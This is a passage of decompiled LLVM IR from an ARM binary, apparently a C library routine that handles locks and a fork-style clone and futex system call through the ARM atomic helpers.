  call void @__pseudo_branch(i32 -61536)
  %v0_d45c = load i32, i32* %r7.global-to-local, align 4
  %v1_d45c = add i32 %v0_d45c, 20
  %v2_d45c = inttoptr i32 %v1_d45c to i32*
  %v3_d45c = load i32, i32* %v2_d45c, align 4
  store i32 %v3_d45c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_d460 = icmp eq i32 %v3_d45c, 0
  store i32 %v3_d45c, i32* %r4.global-to-local, align 4
  %v1_d468 = add i32 %v3_d45c, 1
  store i32 %v1_d468, i32* %r1.global-to-local, align 4
  br i1 %v2_d460, label %dec_label_pc_d520.backedge, label %dec_label_pc_d470

dec_label_pc_d520.backedge:                       ; preds = %dec_label_pc_d450, %dec_label_pc_d49c
  %v0_d520 = load i32, i32* %r8.global-to-local, align 4
  %v1_d520 = load i32, i32* %r5.global-to-local, align 4
  %v2_d520 = add i32 %v1_d520, %v0_d520
  %v3_d520 = inttoptr i32 %v2_d520 to i32*
  %v4_d520 = load i32, i32* %v3_d520, align 4
  store i32 %v4_d520, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_d524 = icmp eq i32 %v4_d520, 0
  br i1 %v2_d524, label %dec_label_pc_d52c, label %dec_label_pc_d450

dec_label_pc_d470:                                ; preds = %dec_label_pc_d450
  %v0_d470 = load i32, i32* %r8.global-to-local, align 4
  %v1_d470 = load i32, i32* %r5.global-to-local, align 4
  %v2_d470 = add i32 %v1_d470, %v0_d470
  %v3_d470 = inttoptr i32 %v2_d470 to i32*
  %v4_d470 = load i32, i32* %v3_d470, align 4
  %v1_d474 = add i32 %v4_d470, 20
  store i32 %v1_d474, i32* %r2.global-to-local, align 4
  %v1_d478132 = inttoptr i32 %v1_d474 to i32*
  %v2_d478133 = load i32, i32* %v1_d478132, align 4
  store i32 %v2_d478133, i32* %r3.global-to-local, align 4
  %v3_d47c135 = icmp uge i32 %v2_d478133, %v3_d45c
  store i1 %v3_d47c135, i1* %cpsr_c.global-to-local, align 1
  %v9_d47c141 = icmp eq i32 %v2_d478133, %v3_d45c
  br i1 %v9_d47c141, label %dec_label_pc_d484, label %dec_label_pc_d49c

dec_label_pc_d484:                                ; preds = %dec_label_pc_d470, %dec_label_pc_d484.dec_label_pc_d478_crit_edge
  %v0_d484142 = phi i32 [ %v1_d47c.pre, %dec_label_pc_d484.dec_label_pc_d478_crit_edge ], [ %v3_d45c, %dec_label_pc_d470 ]
  store i32 %v0_d484142, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_d494 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_d494, label %dec_label_pc_d498, label %dec_label_pc_d484.dec_label_pc_d478_crit_edge

dec_label_pc_d484.dec_label_pc_d478_crit_edge:    ; preds = %dec_label_pc_d484
  %v0_d478.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_d47c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_d478 = inttoptr i32 %v0_d478.pre to i32*
  %v2_d478 = load i32, i32* %v1_d478, align 4
  store i32 %v2_d478, i32* %r3.global-to-local, align 4
  %v3_d47c = icmp uge i32 %v2_d478, %v1_d47c.pre
  store i1 %v3_d47c, i1* %cpsr_c.global-to-local, align 1
  %v9_d47c = icmp eq i32 %v2_d478, %v1_d47c.pre
  br i1 %v9_d47c, label %dec_label_pc_d484, label %dec_label_pc_d49c

dec_label_pc_d498:                                ; preds = %dec_label_pc_d484
  %v0_d498 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_d498, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d49c

dec_label_pc_d49c:                                ; preds = %dec_label_pc_d470, %dec_label_pc_d484.dec_label_pc_d478_crit_edge, %dec_label_pc_d498
  %v0_d49c = phi i32 [ %v0_d498, %dec_label_pc_d498 ], [ %v2_d478133, %dec_label_pc_d470 ], [ %v2_d478, %dec_label_pc_d484.dec_label_pc_d478_crit_edge ]
  %v1_d49c = phi i32 [ %v0_d498, %dec_label_pc_d498 ], [ %v3_d45c, %dec_label_pc_d470 ], [ %v1_d47c.pre, %dec_label_pc_d484.dec_label_pc_d478_crit_edge ]
  %v3_d49c = icmp uge i32 %v0_d49c, %v1_d49c
  store i1 %v3_d49c, i1* %cpsr_c.global-to-local, align 1
  %v9_d49c = icmp eq i32 %v0_d49c, %v1_d49c
  br i1 %v9_d49c, label %dec_label_pc_d4a4, label %dec_label_pc_d520.backedge

dec_label_pc_d4a4:                                ; preds = %dec_label_pc_d49c
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_d4b8 = ptrtoint i32* %stack_var_-88 to i32
  br label %dec_label_pc_d4a8

dec_label_pc_d4a8:                                ; preds = %dec_label_pc_d510, %dec_label_pc_d4a4
  %v0_d4a8 = load i32, i32* %r7.global-to-local, align 4
  %v1_d4a8 = add i32 %v0_d4a8, 4
  %v2_d4a8 = inttoptr i32 %v1_d4a8 to i32*
  %v3_d4a8 = load i32, i32* %v2_d4a8, align 4
  store i32 %v3_d4a8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_d4ac = icmp eq i32 %v3_d4a8, 0
  br i1 %v2_d4ac, label %bb72, label %bb

bb:                                               ; preds = %dec_label_pc_d4a8
  br label %bb72

bb72:                                             ; preds = %dec_label_pc_d4a8, %bb
  %v2_d4b4 = xor i1 %v2_d4ac, true
  call void @__pseudo_cond_branch(i1 %v2_d4b4, i32 %v3_d4a8)
  %v0_d4bc = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_d4bc, i32* %stack_var_-88, align 4
  %v1_d4c0 = inttoptr i32 %v0_d4bc to i32*
  %v2_d4c0 = load i32, i32* %v1_d4c0, align 4
  store i32 %v2_d4c0, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_d4c4 = icmp eq i32 %v2_d4c0, 0
  store i32 %v2_d4b8, i32* %r5.global-to-local, align 4
  br i1 %v2_d4c4, label %dec_label_pc_d530.loopexit, label %dec_label_pc_d4d8

dec_label_pc_d4d8:                                ; preds = %bb72
  %v1_d4d8 = add i32 %v2_d4c0, 20
  store i32 %v1_d4d8, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_d4dc

dec_label_pc_d4dc:                                ; preds = %dec_label_pc_d510.dec_label_pc_d4dc_crit_edge, %dec_label_pc_d4d8
  %v0_d4e0 = phi i32 [ %v0_d4e0.pre, %dec_label_pc_d510.dec_label_pc_d4dc_crit_edge ], [ %v1_d4d8, %dec_label_pc_d4d8 ]
  %v0_d4dc = phi i32 [ %v0_d4dc.pre, %dec_label_pc_d510.dec_label_pc_d4dc_crit_edge ], [ %v2_d4c0, %dec_label_pc_d4d8 ]
  %v1_d4dc = add i32 %v0_d4dc, 20
  %v2_d4dc = inttoptr i32 %v1_d4dc to i32*
  %v3_d4dc = load i32, i32* %v2_d4dc, align 4
  store i32 %v0_d4e0, i32* %r2.global-to-local, align 4
  store i32 %v3_d4dc, i32* %r4.global-to-local, align 4
  %v1_d4e8 = add i32 %v3_d4dc, 1
  store i32 %v1_d4e8, i32* %r1.global-to-local, align 4
  %v1_d4ec119 = inttoptr i32 %v0_d4e0 to i32*
  %v2_d4ec120 = load i32, i32* %v1_d4ec119, align 4
  store i32 %v2_d4ec120, i32* %r3.global-to-local, align 4
  %v3_d4f0122 = icmp uge i32 %v2_d4ec120, %v3_d4dc
  store i1 %v3_d4f0122, i1* %cpsr_c.global-to-local, align 1
  %v9_d4f0128 = icmp eq i32 %v2_d4ec120, %v3_d4dc
  br i1 %v9_d4f0128, label %dec_label_pc_d4f8, label %dec_label_pc_d510

dec_label_pc_d4f8:                                ; preds = %dec_label_pc_d4dc, %dec_label_pc_d4f8.dec_label_pc_d4ec_crit_edge
  %v0_d4f8129 = phi i32 [ %v1_d4f0.pre, %dec_label_pc_d4f8.dec_label_pc_d4ec_crit_edge ], [ %v3_d4dc, %dec_label_pc_d4dc ]
  store i32 %v0_d4f8129, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_d508 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_d508, label %dec_label_pc_d50c, label %dec_label_pc_d4f8.dec_label_pc_d4ec_crit_edge

dec_label_pc_d4f8.dec_label_pc_d4ec_crit_edge:    ; preds = %dec_label_pc_d4f8
  %v0_d4ec.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_d4f0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_d4ec = inttoptr i32 %v0_d4ec.pre to i32*
  %v2_d4ec = load i32, i32* %v1_d4ec, align 4
  store i32 %v2_d4ec, i32* %r3.global-to-local, align 4
  %v3_d4f0 = icmp uge i32 %v2_d4ec, %v1_d4f0.pre
  store i1 %v3_d4f0, i1* %cpsr_c.global-to-local, align 1
  %v9_d4f0 = icmp eq i32 %v2_d4ec, %v1_d4f0.pre
  br i1 %v9_d4f0, label %dec_label_pc_d4f8, label %dec_label_pc_d510

dec_label_pc_d50c:                                ; preds = %dec_label_pc_d4f8
  %v0_d50c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_d50c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d510

dec_label_pc_d510:                                ; preds = %dec_label_pc_d4dc, %dec_label_pc_d4f8.dec_label_pc_d4ec_crit_edge, %dec_label_pc_d50c
  %v0_d510 = phi i32 [ %v0_d50c, %dec_label_pc_d50c ], [ %v2_d4ec120, %dec_label_pc_d4dc ], [ %v2_d4ec, %dec_label_pc_d4f8.dec_label_pc_d4ec_crit_edge ]
  %v1_d510 = phi i32 [ %v0_d50c, %dec_label_pc_d50c ], [ %v3_d4dc, %dec_label_pc_d4dc ], [ %v1_d4f0.pre, %dec_label_pc_d4f8.dec_label_pc_d4ec_crit_edge ]
  %v3_d510 = icmp uge i32 %v0_d510, %v1_d510
  store i1 %v3_d510, i1* %cpsr_c.global-to-local, align 1
  %v9_d510 = icmp eq i32 %v0_d510, %v1_d510
  store i32 %v2_d4b8, i32* %r4.global-to-local, align 4
  br i1 %v9_d510, label %dec_label_pc_d4a8, label %dec_label_pc_d510.dec_label_pc_d4dc_crit_edge

dec_label_pc_d510.dec_label_pc_d4dc_crit_edge:    ; preds = %dec_label_pc_d510
  %v0_d4dc.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_d4e0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_d4dc

dec_label_pc_d52c:                                ; preds = %dec_label_pc_d520.backedge, %entry
  %v0_d53431 = phi i32 [ ptrtoint (i32* @global_var_22290.79 to i32), %entry ], [ %v0_d520, %dec_label_pc_d520.backedge ]
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_d530

dec_label_pc_d530.loopexit:                       ; preds = %bb72
  store i32 %v2_d4b8, i32* %r6.global-to-local, align 4
  %v0_d534.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_d530

dec_label_pc_d530:                                ; preds = %dec_label_pc_d530.loopexit, %dec_label_pc_d52c
  %v0_d534 = phi i32 [ %v0_d534.pre, %dec_label_pc_d530.loopexit ], [ %v0_d53431, %dec_label_pc_d52c ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v2_d534 = add i32 %v0_d534, 160
  %v3_d534 = inttoptr i32 %v2_d534 to i32*
  %v4_d534 = load i32, i32* %v3_d534, align 4
  store i32 %v4_d534, i32* %r7.global-to-local, align 4
  %v0_d538 = call i32 @__aeabi_read_tp()
  store i32 %v0_d538, i32* %r0.global-to-local, align 4
  %v1_d53c = add i32 %v4_d534, 8
  %v2_d53c = inttoptr i32 %v1_d53c to i32*
  %v3_d53c = load i32, i32* %v2_d53c, align 4
  store i32 %v3_d53c, i32* %r3.global-to-local, align 4
  %v1_d540 = add i32 %v0_d538, -1168
  store i32 %v1_d540, i32* %r5.global-to-local, align 4
  %v3_d544 = icmp uge i32 %v3_d53c, %v1_d540
  store i1 %v3_d544, i1* %cpsr_c.global-to-local, align 1
  %v9_d544 = icmp eq i32 %v3_d53c, %v1_d540
  br i1 %v9_d544, label %dec_label_pc_d6ac, label %dec_label_pc_d54c

dec_label_pc_d54c:                                ; preds = %dec_label_pc_d530
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_d534, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_d558112 = inttoptr i32 %v4_d534 to i32*
  %v2_d558113 = load i32, i32* %v1_d558112, align 4
  store i32 %v2_d558113, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_d55c115 = icmp eq i32 %v2_d558113, 0
  br i1 %v9_d55c115, label %dec_label_pc_d564, label %dec_label_pc_d57c

dec_label_pc_d564:                                ; preds = %dec_label_pc_d54c, %dec_label_pc_d564.dec_label_pc_d558_crit_edge
  %v0_d564116 = phi i32 [ %v1_d55c.pre, %dec_label_pc_d564.dec_label_pc_d558_crit_edge ], [ 0, %dec_label_pc_d54c ]
  store i32 %v0_d564116, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_d574 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_d574, label %dec_label_pc_d578, label %dec_label_pc_d564.dec_label_pc_d558_crit_edge

dec_label_pc_d564.dec_label_pc_d558_crit_edge:    ; preds = %dec_label_pc_d564
  %v0_d558.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_d55c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_d558 = inttoptr i32 %v0_d558.pre to i32*
  %v2_d558 = load i32, i32* %v1_d558, align 4
  store i32 %v2_d558, i32* %r3.global-to-local, align 4
  %v3_d55c = icmp uge i32 %v2_d558, %v1_d55c.pre
  store i1 %v3_d55c, i1* %cpsr_c.global-to-local, align 1
  %v9_d55c = icmp eq i32 %v2_d558, %v1_d55c.pre
  br i1 %v9_d55c, label %dec_label_pc_d564, label %dec_label_pc_d57c

dec_label_pc_d578:                                ; preds = %dec_label_pc_d564
  %v0_d578 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_d578, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d57c

dec_label_pc_d57c:                                ; preds = %dec_label_pc_d54c, %dec_label_pc_d564.dec_label_pc_d558_crit_edge, %dec_label_pc_d578
  %v0_d57c = phi i32 [ %v0_d578, %dec_label_pc_d578 ], [ %v2_d558113, %dec_label_pc_d54c ], [ %v2_d558, %dec_label_pc_d564.dec_label_pc_d558_crit_edge ]
  %v1_d57c = phi i32 [ %v0_d578, %dec_label_pc_d578 ], [ 0, %dec_label_pc_d54c ], [ %v1_d55c.pre, %dec_label_pc_d564.dec_label_pc_d558_crit_edge ]
  %v3_d57c = icmp uge i32 %v0_d57c, %v1_d57c
  store i1 %v3_d57c, i1* %cpsr_c.global-to-local, align 1
  %v9_d57c = icmp eq i32 %v0_d57c, %v1_d57c
  br i1 %v9_d57c, label %bb74, label %bb73

bb73:                                             ; preds = %dec_label_pc_d57c
  %v1_d580 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_d580, i32* %r0.global-to-local, align 4
  br label %bb74

bb74:                                             ; preds = %dec_label_pc_d57c, %bb73
  %v1_d584 = xor i1 %v9_d57c, true
  call void @__pseudo_cond_branch(i1 %v1_d584, i32 ptrtoint (i32* @global_var_d7fc.235 to i32))
  %v0_d588 = load i32, i32* %r5.global-to-local, align 4
  %v1_d588 = load i32, i32* %r7.global-to-local, align 4
  %v2_d588 = add i32 %v1_d588, 8
  %v3_d588 = inttoptr i32 %v2_d588 to i32*
  store i32 %v0_d588, i32* %v3_d588, align 4
  br label %dec_label_pc_d6ac

dec_label_pc_d6ac:                                ; preds = %bb74, %dec_label_pc_d530
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_d590 = load i32, i32* %r8.global-to-local, align 4
  %v2_d590 = add i32 %v0_d590, 160
  %v3_d590 = inttoptr i32 %v2_d590 to i32*
  %v4_d590 = load i32, i32* %v3_d590, align 4
  store i32 %v4_d590, i32* %r2.global-to-local, align 4
  %v1_d594 = add i32 %v4_d590, 4
  %v2_d594 = inttoptr i32 %v1_d594 to i32*
  %v3_d594 = load i32, i32* %v2_d594, align 4
  %v1_d598 = add i32 %v3_d594, 1
  store i32 %v1_d598, i32* %r3.global-to-local, align 4
  store i32 %v1_d598, i32* %v2_d594, align 4
  %v0_d5a0 = load i32, i32* %r5.global-to-local, align 4
  %v1_d5a0 = add i32 %v0_d5a0, 108
  %v2_d5a0 = inttoptr i32 %v1_d5a0 to i32*
  %v3_d5a0 = load i32, i32* %v2_d5a0, align 4
  store i32 %v3_d5a0, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_d5a8 = sub i32 0, %v3_d5a0
  store i32 %v1_d5a8, i32* %v2_d5a0, align 4
  store i32 18874385, i32* %r0.global-to-local, align 4
  %v0_d5bc = load i32, i32* %r5.global-to-local, align 4
  %v1_d5bc = add i32 %v0_d5bc, 104
  store i32 %v1_d5bc, i32* %r4.global-to-local, align 4
  store i32 120, i32* %r7.global-to-local, align 4
  store i32 18874385, i32* %r2.global-to-local, align 4
  store i32 18874385, i32* %sb.global-to-local, align 4
  %v0_d6b0.pre = load i32, i32* %sl.global-to-local, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v2_d6b0 = add i32 %v0_d5bc, 108
  %v3_d6b0 = inttoptr i32 %v2_d6b0 to i32*
  store i32 %v0_d6b0.pre, i32* %v3_d6b0, align 4
  %v0_d6b4 = load i32, i32* %r8.global-to-local, align 4
  %v1_d6b4 = load i32, i32* %r3.global-to-local, align 4
  %v2_d6b4 = add i32 %v1_d6b4, %v0_d6b4
  %v3_d6b4 = inttoptr i32 %v2_d6b4 to i32*
  %v4_d6b4 = load i32, i32* %v3_d6b4, align 4
  store i32 %v4_d6b4, i32* %r0.global-to-local, align 4
  %v1_d6b8 = add i32 %v4_d6b4, 4
  %v2_d6b8 = inttoptr i32 %v1_d6b8 to i32*
  %v3_d6b8 = load i32, i32* %v2_d6b8, align 4
  %v1_d6bc = add i32 %v3_d6b8, -1
  store i32 %v1_d6bc, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_d6c0 = icmp eq i32 %v1_d6bc, 0
  store i32 %v1_d6bc, i32* %v2_d6b8, align 4
  br i1 %v2_d6c0, label %dec_label_pc_d6cc, label %dec_label_pc_d7bcthread-pre-split

dec_label_pc_d6cc:                                ; preds = %dec_label_pc_d6ac
  %v0_d6cc = load i32, i32* %r3.global-to-local, align 4
  %v1_d6cc = load i32, i32* %r0.global-to-local, align 4
  %v2_d6cc = add i32 %v1_d6cc, 8
  %v3_d6cc = inttoptr i32 %v2_d6cc to i32*
  store i32 %v0_d6cc, i32* %v3_d6cc, align 4
  %v0_d6d0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_d6d0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_d6d4

dec_label_pc_d6d4:                                ; preds = %dec_label_pc_d704.dec_label_pc_d6d4_crit_edge, %dec_label_pc_d6cc
  %v0_d6d4 = phi i32 [ %v0_d6d4.pre, %dec_label_pc_d704.dec_label_pc_d6d4_crit_edge ], [ %v0_d6d0, %dec_label_pc_d6cc ]
  %v1_d6d4 = inttoptr i32 %v0_d6d4 to i32*
  %v2_d6d4 = load i32, i32* %v1_d6d4, align 4
  store i32 %v2_d6d4, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_d6d4, i32* %r2.global-to-local, align 4
  %v2_d6e0100 = load i32, i32* %v1_d6d4, align 4
  store i32 %v2_d6e0100, i32* %r3.global-to-local, align 4
  %v3_d6e4102 = icmp uge i32 %v2_d6e0100, %v2_d6d4
  store i1 %v3_d6e4102, i1* %cpsr_c.global-to-local, align 1
  %v9_d6e4108 = icmp eq i32 %v2_d6e0100, %v2_d6d4
  br i1 %v9_d6e4108, label %dec_label_pc_d6ec, label %dec_label_pc_d704

dec_label_pc_d6ec:                                ; preds = %dec_label_pc_d6d4, %dec_label_pc_d6ec.dec_label_pc_d6e0_crit_edge
  %v0_d6ec109 = phi i32 [ %v1_d6e4.pre, %dec_label_pc_d6ec.dec_label_pc_d6e0_crit_edge ], [ %v2_d6d4, %dec_label_pc_d6d4 ]
  store i32 %v0_d6ec109, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_d6fc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_d6fc, label %dec_label_pc_d700, label %dec_label_pc_d6ec.dec_label_pc_d6e0_crit_edge

dec_label_pc_d6ec.dec_label_pc_d6e0_crit_edge:    ; preds = %dec_label_pc_d6ec
  %v0_d6e0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_d6e4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_d6e0 = inttoptr i32 %v0_d6e0.pre to i32*
  %v2_d6e0 = load i32, i32* %v1_d6e0, align 4
  store i32 %v2_d6e0, i32* %r3.global-to-local, align 4
  %v3_d6e4 = icmp uge i32 %v2_d6e0, %v1_d6e4.pre
  store i1 %v3_d6e4, i1* %cpsr_c.global-to-local, align 1
  %v9_d6e4 = icmp eq i32 %v2_d6e0, %v1_d6e4.pre
  br i1 %v9_d6e4, label %dec_label_pc_d6ec, label %dec_label_pc_d704

dec_label_pc_d700:                                ; preds = %dec_label_pc_d6ec
  %v0_d700 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_d700, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d704

dec_label_pc_d704:                                ; preds = %dec_label_pc_d6d4, %dec_label_pc_d6ec.dec_label_pc_d6e0_crit_edge, %dec_label_pc_d700
  %v0_d70c = phi i32 [ %v0_d700, %dec_label_pc_d700 ], [ %v2_d6e0100, %dec_label_pc_d6d4 ], [ %v2_d6e0, %dec_label_pc_d6ec.dec_label_pc_d6e0_crit_edge ]
  %v1_d704 = phi i32 [ %v0_d700, %dec_label_pc_d700 ], [ %v2_d6d4, %dec_label_pc_d6d4 ], [ %v1_d6e4.pre, %dec_label_pc_d6ec.dec_label_pc_d6e0_crit_edge ]
  %v3_d704 = icmp uge i32 %v0_d70c, %v1_d704
  store i1 %v3_d704, i1* %cpsr_c.global-to-local, align 1
  %v9_d704 = icmp eq i32 %v0_d70c, %v1_d704
  br i1 %v9_d704, label %dec_label_pc_d70c, label %dec_label_pc_d704.dec_label_pc_d6d4_crit_edge

dec_label_pc_d704.dec_label_pc_d6d4_crit_edge:    ; preds = %dec_label_pc_d704
  %v0_d6d4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_d6d4

dec_label_pc_d70c:                                ; preds = %dec_label_pc_d704
  %v2_d70c = icmp ne i32 %v1_d704, 0
  store i1 %v2_d70c, i1* %cpsr_c.global-to-local, align 1
  %v7_d710 = icmp slt i32 %v1_d704, 2
  br i1 %v7_d710, label %dec_label_pc_d7bcthread-pre-split, label %dec_label_pc_d714

dec_label_pc_d714:                                ; preds = %dec_label_pc_d70c
  %v0_d714 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_d714, i32* %r0.global-to-local, align 4
  %v0_d718 = load i32, i32* %r1.global-to-local, align 4
  %v1_d718 = add i32 %v0_d718, 129
  store i32 %v1_d718, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_d7bcthread-pre-split

dec_label_pc_d730:                                ; preds = %dec_label_pc_d7bcthread-pre-split, %dec_label_pc_d7b8
  %v0_d730 = phi i32 [ %v3_d7b8, %dec_label_pc_d7b8 ], [ %v0_d7bc.pr, %dec_label_pc_d7bcthread-pre-split ]
  %v1_d730 = inttoptr i32 %v0_d730 to i32*
  %v2_d730 = load i32, i32* %v1_d730, align 4
  store i32 %v2_d730, i32* %r3.global-to-local, align 4
  %v1_d734 = add i32 %v2_d730, 8
  %v2_d734 = inttoptr i32 %v1_d734 to i32*
  %v3_d734 = load i32, i32* %v2_d734, align 4
  store i32 %v3_d734, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_d738 = icmp eq i32 %v3_d734, 0
  br i1 %v2_d738, label %bb76, label %bb75

bb75:                                             ; preds = %dec_label_pc_d730
  br label %bb76

bb76:                                             ; preds = %dec_label_pc_d730, %bb75
  %v2_d740 = xor i1 %v2_d738, true
  call void @__pseudo_cond_branch(i1 %v2_d740, i32 %v3_d734)
  %v0_d744 = load i32, i32* %r6.global-to-local, align 4
  %v1_d744 = inttoptr i32 %v0_d744 to i32*
  %v2_d744 = load i32, i32* %v1_d744, align 4
  store i32 %v2_d744, i32* %r5.global-to-local, align 4
  %v1_d748 = add i32 %v2_d744, 20
  store i32 %v1_d748, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_d74c

dec_label_pc_d74c:                                ; preds = %dec_label_pc_d780.dec_label_pc_d74c_crit_edge, %bb76
  %v0_d750 = phi i32 [ %v0_d750.pre, %dec_label_pc_d780.dec_label_pc_d74c_crit_edge ], [ %v1_d748, %bb76 ]
  %v0_d74c = phi i32 [ %v0_d74c.pre, %dec_label_pc_d780.dec_label_pc_d74c_crit_edge ], [ %v2_d744, %bb76 ]
  %v1_d74c = add i32 %v0_d74c, 20
  %v2_d74c = inttoptr i32 %v1_d74c to i32*
  %v3_d74c = load i32, i32* %v2_d74c, align 4
  store i32 %v0_d750, i32* %r2.global-to-local, align 4
  store i32 %v3_d74c, i32* %r4.global-to-local, align 4
  %v1_d758 = add i32 %v3_d74c, -1
  store i32 %v1_d758, i32* %r1.global-to-local, align 4
  %v1_d75c87 = inttoptr i32 %v0_d750 to i32*
  %v2_d75c88 = load i32, i32* %v1_d75c87, align 4
  store i32 %v2_d75c88, i32* %r3.global-to-local, align 4
  %v3_d76090 = icmp uge i32 %v2_d75c88, %v3_d74c
  store i1 %v3_d76090, i1* %cpsr_c.global-to-local, align 1
  %v9_d76096 = icmp eq i32 %v2_d75c88, %v3_d74c
  br i1 %v9_d76096, label %dec_label_pc_d768, label %dec_label_pc_d780

dec_label_pc_d768:                                ; preds = %dec_label_pc_d74c, %dec_label_pc_d768.dec_label_pc_d75c_crit_edge
  %v0_d76897 = phi i32 [ %v1_d760.pre, %dec_label_pc_d768.dec_label_pc_d75c_crit_edge ], [ %v3_d74c, %dec_label_pc_d74c ]
  store i32 %v0_d76897, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_d778 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_d778, label %dec_label_pc_d77c, label %dec_label_pc_d768.dec_label_pc_d75c_crit_edge

dec_label_pc_d768.dec_label_pc_d75c_crit_edge:    ; preds = %dec_label_pc_d768
  %v0_d75c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_d760.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_d75c = inttoptr i32 %v0_d75c.pre to i32*
  %v2_d75c = load i32, i32* %v1_d75c, align 4
  store i32 %v2_d75c, i32* %r3.global-to-local, align 4
  %v3_d760 = icmp uge i32 %v2_d75c, %v1_d760.pre
  store i1 %v3_d760, i1* %cpsr_c.global-to-local, align 1
  %v9_d760 = icmp eq i32 %v2_d75c, %v1_d760.pre
  br i1 %v9_d760, label %dec_label_pc_d768, label %dec_label_pc_d780

dec_label_pc_d77c:                                ; preds = %dec_label_pc_d768
  %v0_d77c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_d77c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d780

dec_label_pc_d780:                                ; preds = %dec_label_pc_d74c, %dec_label_pc_d768.dec_label_pc_d75c_crit_edge, %dec_label_pc_d77c
  %v0_d78c = phi i32 [ %v0_d77c, %dec_label_pc_d77c ], [ %v2_d75c88, %dec_label_pc_d74c ], [ %v2_d75c, %dec_label_pc_d768.dec_label_pc_d75c_crit_edge ]
  %v1_d780 = phi i32 [ %v0_d77c, %dec_label_pc_d77c ], [ %v3_d74c, %dec_label_pc_d74c ], [ %v1_d760.pre, %dec_label_pc_d768.dec_label_pc_d75c_crit_edge ]
  %v3_d780 = icmp uge i32 %v0_d78c, %v1_d780
  store i1 %v3_d780, i1* %cpsr_c.global-to-local, align 1
  %v9_d780 = icmp eq i32 %v0_d78c, %v1_d780
  store i32 %v0_d78c, i32* %r2.global-to-local, align 4
  br i1 %v9_d780, label %dec_label_pc_d78c, label %dec_label_pc_d780.dec_label_pc_d74c_crit_edge

dec_label_pc_d780.dec_label_pc_d74c_crit_edge:    ; preds = %dec_label_pc_d780
  %v0_d74c.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_d750.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_d74c

dec_label_pc_d78c:                                ; preds = %dec_label_pc_d780
  %v2_d78c = icmp ne i32 %v1_d780, 0
  store i1 %v2_d78c, i1* %cpsr_c.global-to-local, align 1
  %v7_d78c = icmp eq i32 %v1_d780, 1
  %v0_d794 = load i32, i32* %r6.global-to-local, align 4
  br i1 %v7_d78c, label %dec_label_pc_d794, label %dec_label_pc_d7b8

dec_label_pc_d794:                                ; preds = %dec_label_pc_d78c
  %v1_d794 = inttoptr i32 %v0_d794 to i32*
  %v2_d794 = load i32, i32* %v1_d794, align 4
